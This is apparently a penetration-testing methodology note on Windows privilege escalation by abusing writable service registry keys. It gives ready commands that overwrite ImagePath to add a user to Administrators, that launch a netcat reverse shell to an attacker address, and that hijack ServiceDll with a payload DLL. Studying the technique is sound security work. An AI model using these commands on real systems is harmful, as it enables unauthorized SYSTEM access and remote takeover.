---
created: 2026-08-26
updated: 2026-09-20
tags:
  - Windows
  - Windows_PrivEsc
status: complete
---
>[!abstract] **Scope**: exploiting weak service registry key permissions.

- [ ] Enumerate service registry key permissions using `accesschk.exe` or PowerShell `Get-Acl`.
- [ ] Identify target service subkeys where non-administrative accounts hold `KEY_SET_VALUE`, `KEY_WRITE`, or `KEY_ALL_ACCESS` permissions.
- [ ] Query the existing service registry values (`reg query` or `Get-ItemProperty`).
- [ ] Record the original `ImagePath` or `ServiceDll` value before modification.
- [ ] Overwrite `ImagePath` with a payload command string via `reg add` or `Set-ItemProperty`.
- [ ] Overwrite `Parameters\ServiceDll` for shared `svchost.exe` services.
- [ ] Restart the target service (`sc.exe stop`/`start` or system reboot).
- [ ] Verify elevated privileges and restore the original registry configuration.

---

## Service registry

- Windows service definitions and startup configuration are stored in the registry under `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>`.
- Important values stored within the subkey:

| Registry value | Data type | Operational purpose |
| :--- | :--- | :--- |
| `ImagePath` | `REG_EXPAND_SZ` | Fully qualified path to the service executable and startup command arguments. |
| `ObjectName` | `REG_SZ` | Account security context under which the service process runs (e.g., `LocalSystem`). |
| `Start` | `REG_DWORD` | Startup type configuration (`2` = Automatic, `3` = Manual, `4` = Disabled). |
| `Type` | `REG_DWORD` | Service process type (`0x10` for standalone process, `0x20` for shared process hosted in `svchost.exe`). |
| `ServiceDll` | `REG_EXPAND_SZ` | Path to the service DLL executed by `svchost.exe` (located under the `Parameters` subkey). |

- Even if you can't modify service configuration using `sc.exe config`, weak permissions on the underlying service registry subkey may allow you to overwrite values such as `ImagePath` or `ServiceDll` directly.
- Say, pointing `ImagePath` to your custom executable, or pointing `ServiceDll` to a DLL with your payload, executes your code under the same security context as the service (often `NT AUTHORITY\SYSTEM`) when the service restarts.

>[!important] SCM access rights vs. registry key permissions
>- SCM access rights (such as `SERVICE_CHANGE_CONFIG`) control modification attempts performed through SCM RPC interfaces (`sc.exe config`).
>- Registry DACLs control direct read and write operations inside `HKLM\SYSTEM\CurrentControlSet\Services\`. If an account holds `KEY_SET_VALUE`, `KEY_WRITE`, or `KEY_ALL_ACCESS` on a service subkey, you can bypass SCM-level restrictions by writing directly to the registry.

## Enumerating service registry key permissions

- Search for service registry keys modifiable by your current user account using [`AccessChk`](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk):

```powershell
accesschk.exe /accepteula "jdoe" -kvuqsw hklm\System\CurrentControlSet\services
```

>[!note]+ `accesschk.exe` registry flags
> | Flag | Description |
> | :--- | :--- |
> | `-k` | Specifies search target as a Windows registry path. |
> | `-v` | Enables verbose output displaying detailed registry access rights. |
> | `-u` | Suppresses error and access denied messages. |
> | `-q` | Omits the Sysinternals startup banner. |
> | `-s` | Recurses through subkeys under the specified path. |
> | `-w` | Displays only objects for which the specified account has write access. |

> [!example]-
> ```powershell
> PS C:\> accesschk.exe /accepteula "jdoe" -kvuqsw hklm\System\CurrentControlSet\services
>
> Accesschk v6.13 - Reports effective permissions for securable objects
> Copyright © 2006-2020 Mark Russinovich
> Sysinternals - www.sysinternals.com
>
> RW HKLM\System\CurrentControlSet\services\ModelManagerService
>         KEY_ALL_ACCESS
> ```

- Inspect effective permissions on a specific service registry key using PowerShell `Get-Acl`:

```powershell
Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService" | Format-List
```

- Display the Access Control Entries (ACEs) for the target service registry key:

```powershell
(Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService").Access | Select-Object IdentityReference, RegistryRights, AccessControlType | Format-Table -AutoSize
```

- Alternatively, store the ACL object in a variable to reuse it for filtering multiple times:

```powershell
$acl = Get-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService"
$acl.Access | Format-Table IdentityReference, RegistryRights, AccessControlType -AutoSize
```

- Query the existing `ImagePath` configuration to record the original binary path:

```powershell
reg query "HKLM\SYSTEM\CurrentControlSet\Services\ModelManagerService" /v ImagePath
```

## Modifying standalone service executable paths

- Overwrite the target service `ImagePath` value using `reg.exe` to configure a payload that adds `jdoe` to the local `Administrators` group:

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ModelManagerService" /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c net localgroup administrators jdoe /add" /f
```

| Flag | Parameter | Description |
| :--- | :--- | :--- |
| `/v` | `ImagePath` | Specifies the registry value name to modify or create. |
| `/t` | `REG_EXPAND_SZ` | Sets the registry data type as an expandable string. |
| `/d` | `"cmd.exe /c ..."` | Specifies the command data to write into the value. |
| `/f` | None | Forces overwriting the existing registry value without prompting. |

- Overwrite `ImagePath` to execute a Netcat reverse shell payload:

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ModelManagerService" /v ImagePath /t REG_EXPAND_SZ /d "cmd.exe /c C:\Temp\nc.exe -e cmd.exe <attacker_ip_address> 443" /f
```

- Modify `ImagePath` using PowerShell `Set-ItemProperty`:

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService" -Name "ImagePath" -Value "cmd.exe /c net localgroup administrators jdoe /add"
```

## Hijacking shared service DLLs

- Shared services (`Type` value `0x20` / `WIN32_SHARE_PROCESS`) run inside a shared `svchost.exe` process instance.
- For shared services, `ImagePath` points to `%SystemRoot%\System32\svchost.exe -k <ServiceGroup>`, while the specific code executed is defined by the `ServiceDll` value under the `Parameters` subkey:

```powershell
HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>\Parameters\ServiceDll
```

- Query the existing `ServiceDll` path:

```powershell
reg query "HKLM\SYSTEM\CurrentControlSet\Services\ModelManagerService\Parameters" /v ServiceDll
```

- If your account holds write permissions on the `Parameters` subkey, overwrite `ServiceDll` to point to a custom payload DLL:

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Services\ModelManagerService\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "C:\Temp\evil.dll" /f
```

>[!note] When the shared service starts, `svchost.exe` calls `LoadLibrary` on the configured `ServiceDll` path and invokes the service entry point, running the payload DLL within the `SYSTEM` context.

## Triggering execution and verifying access

- Stop the target service:

```powershell
sc.exe stop ModelManagerService
```

- Start the service to trigger payload execution:

```powershell
sc.exe start ModelManagerService
```

>[!example]+ Expected service start error
> ```powershell
> PS C:\Tools> sc.exe start ModelManagerService
> [SC] StartService FAILED 1053:
>
> The service did not respond to the start or control request in a timely fashion.
> ```

- The service fails to maintain an active running state when `ImagePath` is replaced with `cmd.exe` because standard command wrappers do not implement the SCM dispatch handler.
- However, the command **executes immediately before the SCM returns the error**.

- If you don't have permissions to start or stop the service via `sc.exe`, check whether the `Start` value is set to `2` (Automatic). If set to Automatic, reboot the host with `shutdown /r /t 0` or kill the active process to force SCM to respawn the service.

>[!tip]+
> - Verify that your account has been added to the local `Administrators` group:
> ```powershell
> net localgroup administrators
> ```
> - Verify effective token privileges:
> ```powershell
> whoami /priv
> ```

>[!tip]+
> - Restore the original service `ImagePath` value:
> ```powershell
> reg add "HKLM\SYSTEM\CurrentControlSet\Services\ModelManagerService" /v ImagePath /t REG_EXPAND_SZ /d "\"C:\Program Files\ModelManager\ModelManagerService.exe\"" /f
> ```
> - If `ServiceDll` was modified, restore the original DLL path:
> ```powershell
> reg add "HKLM\SYSTEM\CurrentControlSet\Services\ModelManagerService\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "C:\Program Files\ModelManager\ModelManagerService.dll" /f
> ```
> - Restart the service to confirm clean restoration:
> ```powershell
> sc.exe start ModelManagerService
> ```

## References and further reading

- [`Registry Element Security and Access Rights — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-element-security-and-access-rights)
- [`AccessChk — Microsoft Sysinternals`](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
- [`sc.exe command syntax — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config)
- [`Modifying Service Registry Keys — HackTricks`](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#modifying-service-registry-keys)
